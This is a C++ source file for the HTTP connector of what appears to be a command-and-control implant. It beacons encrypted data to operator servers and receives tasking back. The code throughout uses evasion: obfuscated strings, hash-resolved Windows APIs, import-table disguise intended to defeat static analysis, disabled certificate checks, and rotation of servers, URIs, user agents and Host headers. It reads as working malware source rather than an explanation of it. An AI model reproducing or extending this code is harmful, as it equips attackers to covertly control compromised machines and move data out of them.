#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "StrObfuscate.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"
#include "Agent.h"
#include "OpsecThread.h"
#include "IatDisguise.h"

extern Agent* g_Agent;

BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str)
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;

	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while (_isdigest(str[index])) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10)
			return (sign == 1) ? INT_MAX : INT_MIN;

		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}

static BOOL HttpStatusIs200W(const WCHAR* statusBuf)
{
	return statusBuf && statusBuf[0] == L'2' && statusBuf[1] == L'0' && statusBuf[2] == L'0' && statusBuf[3] == 0;
}

static WCHAR* HttpMbToWc(HTTPFUNC* fn, const CHAR* mb)
{
	if (!mb)
		return NULL;
	int n = ApiWin->MultiByteToWideChar(CP_ACP, 0, mb, -1, NULL, 0);
	if (n <= 0)
		return NULL;
	WCHAR* w = (WCHAR*)fn->LocalAlloc(LPTR, (ULONG)(n * (int)sizeof(WCHAR)));
	if (!w)
		return NULL;
	ApiWin->MultiByteToWideChar(CP_ACP, 0, mb, -1, w, n);
	return w;
}

BOOL ConnectorHTTP_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize);
void ConnectorHTTP_SendData(Connector* self, BYTE* data_buf, ULONG data_size);
BYTE* ConnectorHTTP_RecvData(Connector* self);
int ConnectorHTTP_RecvSize(Connector* self);
void ConnectorHTTP_RecvClear(Connector* self);
void ConnectorHTTP_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey);
void ConnectorHTTP_CloseConnector(Connector* self);

Connector* CreateConnectorHTTP()
{
	Connector* conn = (Connector*)MemAllocLocal(sizeof(Connector));
	ConnectorHTTPData* data = (ConnectorHTTPData*)MemAllocLocal(sizeof(ConnectorHTTPData));
	conn->instanceData = data;

	data->functions = (HTTPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));

	data->functions->LocalAlloc   = ApiWin->LocalAlloc;
	data->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	data->functions->LocalFree    = ApiWin->LocalFree;
	data->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	data->functions->GetProcAddress = ApiWin->GetProcAddress;
	data->functions->GetLastError = ApiWin->GetLastError;

	CHAR winhttp_c[16];
	AxDeobfuscateToStack(winhttp_c, sizeof(winhttp_c), g_ax_obf_winhttp);

	HMODULE hWinhttp = data->functions->LoadLibraryA(winhttp_c);
	if (hWinhttp) {
		data->functions->WinHttpOpen            = (decltype(WinHttpOpen)*)            GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPOPEN);
		data->functions->WinHttpCloseHandle     = (decltype(WinHttpCloseHandle)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPCLOSEHANDLE);
		data->functions->WinHttpConnect         = (decltype(WinHttpConnect)*)         GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPCONNECT);
		data->functions->WinHttpOpenRequest     = (decltype(WinHttpOpenRequest)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPOPENREQUEST);
		data->functions->WinHttpSendRequest     = (decltype(WinHttpSendRequest)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPSENDREQUEST);
		data->functions->WinHttpReceiveResponse = (decltype(WinHttpReceiveResponse)*) GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPRECEIVERESPONSE);
		data->functions->WinHttpQueryHeaders    = (decltype(WinHttpQueryHeaders)*)    GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPQUERYHEADERS);
		data->functions->WinHttpReadData        = (decltype(WinHttpReadData)*)        GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPREADDATA);
		data->functions->WinHttpSetOption      = (decltype(WinHttpSetOption)*)       GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPSETOPTION);
		data->functions->WinHttpAddRequestHeaders = (decltype(WinHttpAddRequestHeaders)*) GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
		data->functions->WinHttpWriteData      = (decltype(WinHttpWriteData)*)       GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWRITEDATA);
	}

	// Disguise IAT entries to frustrate static analysis
	IatDisguise_Init();
	AX_SPOOF_CONNECTOR_JUNK();

	conn->SetProfile = ConnectorHTTP_SetProfile;
	conn->WaitForConnection = Connector_DefaultWaitForConnection;
	conn->IsConnected = Connector_DefaultIsConnected;
	conn->Disconnect = Connector_DefaultDisconnect;
	conn->Exchange = ConnectorHTTP_Exchange;
	conn->RecvData = ConnectorHTTP_RecvData;
	conn->RecvSize = ConnectorHTTP_RecvSize;
	conn->RecvClear = ConnectorHTTP_RecvClear;
	conn->Sleep = Connector_DefaultSleep;
	conn->CloseConnector = ConnectorHTTP_CloseConnector;

	return conn;
}

BOOL ConnectorHTTP_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize)
{
	ConnectorHTTPData* data = (ConnectorHTTPData*)self->instanceData;
	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;
	LPSTR encBeat = b64_encode(beatData, beatDataSize);

	ULONG enc_beat_length = StrLenA(encBeat);
	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);

	CHAR* HttpHeaders = (CHAR*)data->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
	memcpy(HttpHeaders, profile.http_headers, headers_length);
	ULONG index = headers_length;
	memcpy(HttpHeaders + index, profile.parameter, param_length);
	index += param_length;
	HttpHeaders[index++] = ':';
	HttpHeaders[index++] = ' ';
	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
	index += enc_beat_length;
	HttpHeaders[index++] = '\r';
	HttpHeaders[index++] = '\n';
	HttpHeaders[index++] = 0;

	memset(encBeat, 0, enc_beat_length);
	data->functions->LocalFree(encBeat);
	encBeat = NULL;

	data->headers        = HttpHeaders;
	data->server_count   = profile.servers_count;
	data->server_address = (CHAR**)profile.servers;
	data->server_ports   = profile.ports;
	data->ssl            = profile.use_ssl;
	data->http_method    = (CHAR*)profile.http_method;
	data->uri_count      = profile.uri_count;
	data->uris           = (CHAR**)profile.uris;
	data->ua_count       = profile.ua_count;
	data->user_agents    = (CHAR**)profile.user_agents;
	data->hh_count       = profile.hh_count;
	data->host_headers   = (CHAR**)profile.host_headers;
	data->rotation_mode  = profile.rotation_mode;
	data->ans_size       = profile.ans_size;
	data->ans_pre_size   = profile.ans_pre_size;

	data->proxy_type     = profile.proxy_type;
	data->proxy_username = (CHAR*)profile.proxy_username;
	data->proxy_password = (CHAR*)profile.proxy_password;

	if (data->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
		WORD port = profile.proxy_port;
		CHAR portStr[6];
		int portIdx = 0;
		if (port == 0) {
			portStr[portIdx++] = '0';
		}
		else {
			CHAR temp[6];
			int tempIdx = 0;
			while (port > 0) {
				temp[tempIdx++] = '0' + (port % 10);
				port /= 10;
			}
			for (int i = tempIdx - 1; i >= 0; i--) {
				portStr[portIdx++] = temp[i];
			}
		}
		portStr[portIdx] = 0;

		ULONG prefixLen = 0;
		if (data->proxy_type == PROXY_TYPE_HTTPS) {
			prefixLen = 8;
		}
		data->proxy_url = (CHAR*)data->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
		ULONG idx = 0;
		if (data->proxy_type == PROXY_TYPE_HTTPS) {
			data->proxy_url[idx++] = 'h';
			data->proxy_url[idx++] = 't';
			data->proxy_url[idx++] = 't';
			data->proxy_url[idx++] = 'p';
			data->proxy_url[idx++] = 's';
			data->proxy_url[idx++] = ':';
			data->proxy_url[idx++] = '/';
			data->proxy_url[idx++] = '/';
		}
		memcpy(data->proxy_url + idx, profile.proxy_host, hostLen);
		idx += hostLen;
		data->proxy_url[idx++] = ':';
		memcpy(data->proxy_url + idx, portStr, portIdx + 1);
	}

	return TRUE;
}

void ConnectorHTTP_SendData(Connector* self, BYTE* data_buf, ULONG data_size)
{
	ConnectorHTTPData* data = (ConnectorHTTPData*)self->instanceData;
	data->recvSize = 0;
	data->recvData = 0;

	ULONG attempt = 0;
	BOOL  connected = FALSE;
	BOOL  result = FALSE;

	if (data->hConnect) {
		data->functions->WinHttpCloseHandle(data->hConnect);
		data->hConnect = NULL;
	}
	if (data->hInternet) {
		data->functions->WinHttpCloseHandle(data->hInternet);
		data->hInternet = NULL;
	}

	while (!connected && attempt < data->server_count) {
		DWORD dwError = 0;

		if (!data->hInternet) {
			WCHAR* wUA = HttpMbToWc(data->functions, data->user_agents[data->ua_index]);
			if (!wUA) {
				attempt++;
				continue;
			}

			DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
			WCHAR* proxyW = NULL;
			if (data->proxy_url != NULL) {
				accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
				proxyW = HttpMbToWc(data->functions, data->proxy_url);
			}

			data->hInternet = data->functions->WinHttpOpen(wUA, accessType, proxyW, WINHTTP_NO_PROXY_BYPASS, 0);
			data->functions->LocalFree(wUA);
			if (proxyW)
				data->functions->LocalFree(proxyW);
		}
		if (data->hInternet) {

			if (!data->hConnect) {
				WCHAR* wHost = HttpMbToWc(data->functions, data->server_address[data->server_index]);
				if (!wHost) {
					data->functions->WinHttpCloseHandle(data->hInternet);
					data->hInternet = NULL;
					attempt++;
					continue;
				}
				INTERNET_PORT port = data->server_ports[data->server_index];
				data->hConnect = data->functions->WinHttpConnect(data->hInternet, wHost, port, 0);
				data->functions->LocalFree(wHost);
			}

			if (data->hConnect)
			{
				WCHAR* wMethod = HttpMbToWc(data->functions, data->http_method);
				WCHAR* wUri = HttpMbToWc(data->functions, data->uris[data->uri_index]);
				if (!wMethod || !wUri) {
					if (wMethod) data->functions->LocalFree(wMethod);
					if (wUri) data->functions->LocalFree(wUri);
				} else {

				DWORD reqFlags = WINHTTP_FLAG_REFRESH;
				if (data->ssl)
					reqFlags |= WINHTTP_FLAG_SECURE;

				HINTERNET hRequest = data->functions->WinHttpOpenRequest(data->hConnect, wMethod, wUri, NULL, WINHTTP_NO_REFERER,
					WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
				data->functions->LocalFree(wMethod);
				data->functions->LocalFree(wUri);

				if (hRequest) {
					if (data->ssl) {
						DWORD dwSec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
							| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
						data->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSec, sizeof(dwSec));
					}

					if (data->proxy_type != PROXY_TYPE_NONE && data->proxy_username != NULL) {
						WCHAR* wu = HttpMbToWc(data->functions, data->proxy_username);
						if (wu) {
							DWORD ccb = (DWORD)((StrLenA(data->proxy_username) + 1) * sizeof(WCHAR));
							data->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_USERNAME, wu, ccb);
							data->functions->LocalFree(wu);
						}
						if (data->proxy_password != NULL) {
							WCHAR* wp = HttpMbToWc(data->functions, data->proxy_password);
							if (wp) {
								DWORD ccbp = (DWORD)((StrLenA(data->proxy_password) + 1) * sizeof(WCHAR));
								data->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_PASSWORD, wp, ccbp);
								data->functions->LocalFree(wp);
							}
						}
					}

					CHAR* reqHeaders = data->headers;
					CHAR* tmpHeaders = NULL;
					if (data->hh_count > 0) {
						CHAR* currentHH = data->host_headers[data->hh_index];
						ULONG hhLen = StrLenA(currentHH);
						ULONG baseLen = StrLenA(data->headers);
						WORD currentPort = data->server_ports[data->server_index];

						BOOL hasPort = FALSE;
						for (ULONG i = 0; i < hhLen; i++) {
							if (currentHH[i] == ':') {
								hasPort = TRUE;
								break;
							}
						}

						BOOL needPort = FALSE;
						CHAR portStr[6] = {0};
						ULONG portLen = 0;
						if (!hasPort) {
							if ((data->ssl && currentPort != 443) || (!data->ssl && currentPort != 80)) {
								needPort = TRUE;
								WORD port = currentPort;
								if (port == 0) {
									portStr[portLen++] = '0';
								} else {
									CHAR temp[6];
									int tempIdx = 0;
									while (port > 0) {
										temp[tempIdx++] = '0' + (port % 10);
										port /= 10;
									}
									for (int i = tempIdx - 1; i >= 0; i--) {
										portStr[portLen++] = temp[i];
									}
								}
								portStr[portLen] = 0;
							}
						}

						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
						tmpHeaders = (CHAR*)data->functions->LocalAlloc(LPTR, allocSize);
						ULONG off = 0;
						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
						if (needPort) {
							tmpHeaders[off++] = ':';
							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
						}
						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
						memcpy(tmpHeaders + off, data->headers, baseLen); off += baseLen;
						tmpHeaders[off] = 0;
						reqHeaders = tmpHeaders;
					}

					WCHAR* hdrW = HttpMbToWc(data->functions, reqHeaders);
					if (tmpHeaders) {
						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
						data->functions->LocalFree(tmpHeaders);
					}

					BOOL sent = FALSE;
					if (hdrW) {
						Opsec_PreBlockingWinHttp();
						sent = data->functions->WinHttpSendRequest(hRequest, hdrW, (DWORD)-1, NULL, 0, data_size, 0);
					}
					if (hdrW)
						data->functions->LocalFree(hdrW);

					if (sent && data_buf && data_size > 0) {
						DWORD writtenTotal = 0;
						while (writtenTotal < data_size) {
							DWORD chunk = data_size - writtenTotal;
							if (chunk > 0x1000)
								chunk = 0x1000;
							DWORD wrote = 0;
							if (!data->functions->WinHttpWriteData(hRequest, data_buf + writtenTotal, chunk, &wrote) || wrote == 0)
								break;
							writtenTotal += wrote;
						}
						if (writtenTotal != data_size)
							sent = FALSE;
					}

					connected = sent && data->functions->WinHttpReceiveResponse(hRequest, NULL);

					if (connected) {
						WCHAR statusCode[16];
						DWORD statusLen = sizeof(statusCode);
						result = data->functions->WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE, WINHTTP_HEADER_NAME_BY_INDEX,
							statusCode, &statusLen, WINHTTP_NO_HEADER_INDEX);

						if (result && HttpStatusIs200W(statusCode)) {
							DWORD answerSize = 0;
							DWORD cbCL = sizeof(answerSize);
							result = data->functions->WinHttpQueryHeaders(hRequest,
								WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
								WINHTTP_HEADER_NAME_BY_INDEX, &answerSize, &cbCL, WINHTTP_NO_HEADER_INDEX);

							if (result && answerSize > 0) {
								BYTE* buffer = (BYTE*)data->functions->LocalAlloc(LPTR, answerSize);
								ULONG numberReadedBytes = 0;
								while (numberReadedBytes < answerSize) {
									DWORD readedBytes = 0;
									if (!data->functions->WinHttpReadData(hRequest, buffer + numberReadedBytes,
										answerSize - numberReadedBytes, &readedBytes) || !readedBytes)
										break;
									numberReadedBytes += readedBytes;
								}
								data->recvSize = numberReadedBytes;
								data->recvData = buffer;
							}
							else if (data->functions->GetLastError() == ERROR_WINHTTP_HEADER_NOT_FOUND) {
								ULONG numberReadedBytes = 0;
								DWORD readedBytes = 0;
								BYTE* buffer = NULL;
								BYTE chunkBuf[0x1000];

								while (1) {
									readedBytes = 0;
									if (!data->functions->WinHttpReadData(hRequest, chunkBuf, sizeof(chunkBuf), &readedBytes) || readedBytes == 0)
										break;
									if (buffer == NULL) {
										buffer = (BYTE*)data->functions->LocalAlloc(LPTR, readedBytes);
										if (!buffer)
											break;
										memcpy(buffer, chunkBuf, readedBytes);
										numberReadedBytes = readedBytes;
									} else {
										BYTE* nb = (BYTE*)data->functions->LocalReAlloc(buffer, numberReadedBytes + readedBytes, LMEM_MOVEABLE);
										if (!nb)
											break;
										buffer = nb;
										memcpy(buffer + numberReadedBytes, chunkBuf, readedBytes);
										numberReadedBytes += readedBytes;
									}
								}
								if (numberReadedBytes && buffer) {
									data->recvSize = numberReadedBytes;
									data->recvData = buffer;
								}
								else if (buffer) {
									data->functions->LocalFree(buffer);
								}
							}
						}
					}
					else {
						dwError = data->functions->GetLastError();
					}
					data->functions->WinHttpCloseHandle(hRequest);
				}
				}
			}

			attempt++;
			if (!connected) {
				if (data->hConnect) {
					data->functions->WinHttpCloseHandle(data->hConnect);
					data->hConnect = NULL;
				}
				if (data->hInternet) {
					data->functions->WinHttpCloseHandle(data->hInternet);
					data->hInternet = NULL;
				}

				data->server_index = (data->server_index + 1) % data->server_count;
			}

			if (data->rotation_mode == 1) {
				data->uri_index = GenerateRandom32() % data->uri_count;
				data->ua_index = GenerateRandom32() % data->ua_count;
				data->server_index = GenerateRandom32() % data->server_count;
				if (data->hh_count > 0)
					data->hh_index = GenerateRandom32() % data->hh_count;
			}
			else {
				data->uri_index = (data->uri_index + 1) % data->uri_count;
				data->ua_index = (data->ua_index + 1) % data->ua_count;
				data->server_index = (data->server_index + 1) % data->server_count;
				if (data->hh_count > 0)
					data->hh_index = (data->hh_index + 1) % data->hh_count;
			}
		}
	}
}

BYTE* ConnectorHTTP_RecvData(Connector* self)
{
	ConnectorHTTPData* data = (ConnectorHTTPData*)self->instanceData;
	if (data->recvData)
		return data->recvData + data->ans_pre_size;
	else
		return NULL;
}

int ConnectorHTTP_RecvSize(Connector* self)
{
	ConnectorHTTPData* data = (ConnectorHTTPData*)self->instanceData;
	if (data->recvSize < data->ans_size)
		return 0;

	return data->recvSize - data->ans_size;
}

void ConnectorHTTP_RecvClear(Connector* self)
{
	ConnectorHTTPData* data = (ConnectorHTTPData*)self->instanceData;
	if (data->recvData && data->recvSize) {
		memset(data->recvData, 0, data->recvSize);
		data->functions->LocalFree(data->recvData);
		data->recvData = NULL;
	}
}

void ConnectorHTTP_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	ConnectorHTTPData* data = (ConnectorHTTPData*)self->instanceData;
	if (plainData && plainSize > 0) {
		EncryptSessionTransport(plainData, plainSize, sessionKey, g_Agent->config->transport_salt);
		ConnectorHTTP_SendData(self, plainData, plainSize);
	}
	else {
		ConnectorHTTP_SendData(self, NULL, 0);
	}

	if (data->recvSize > 0 && data->recvData) {
		int dataSize = self->RecvSize(self);
		BYTE* dataPtr = self->RecvData(self);
		if (dataSize > 0 && dataPtr)
			DecryptSessionTransport(dataPtr, dataSize, sessionKey, g_Agent->config->transport_salt);
	}
}

void ConnectorHTTP_CloseConnector(Connector* self)
{
	ConnectorHTTPData* data = (ConnectorHTTPData*)self->instanceData;
	if (data->headers) {
		DWORD l = StrLenA(data->headers);
		memset(data->headers, 0, l);
		data->functions->LocalFree(data->headers);
		data->headers = NULL;
	}

	if (data->hConnect) {
		data->functions->WinHttpCloseHandle(data->hConnect);
		data->hConnect = NULL;
	}
	if (data->hInternet) {
		data->functions->WinHttpCloseHandle(data->hInternet);
		data->hInternet = NULL;
	}
}
